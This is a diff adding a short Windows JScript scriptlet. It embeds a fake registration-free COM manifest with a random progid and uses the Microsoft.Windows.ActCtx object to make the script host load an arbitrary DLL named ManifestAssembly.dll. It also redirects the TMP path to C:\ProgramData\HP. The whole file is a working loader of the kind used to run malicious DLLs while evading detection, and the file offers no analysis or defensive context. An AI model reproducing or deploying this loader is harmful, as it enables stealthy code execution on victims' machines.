@@ -1,0 +1,16 @@
+<?XML version="1.0"?>
+<scriptlet>
+  <script language="JavaScript">
+    <![CDATA[
+		var ManifestXML = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><assemblyIdentity type="win64" name="COM" version="1.0.0.0"/> <file name="ManifestAssembly.dll"> <comClass description="HSNJDUJHAFKAJSFBF" clsid="{5e18b3dc-5174-481c-bd29-2d4a7ca7e8b5}" threadingModel="Both" progid="HSNJDUJHAFKAJSFBF"/></file></assembly>';
+		 
+		var s = new ActiveXObject('WScript.Shell');
+		s.Environment('Process')('TMP') = 'C:\\ProgramData\\HP';
+		 
+		var actCtx = new ActiveXObject("Microsoft.Windows.ActCtx");
+		actCtx.ManifestText = ManifestXML;
+
+		actCtx.CreateObject("HSNJDUJHAFKAJSFBF"); // If you do not actually CreateObject the fake SxS assembly is never loaded via context
+    ]]>
+</script>
+</scriptlet>
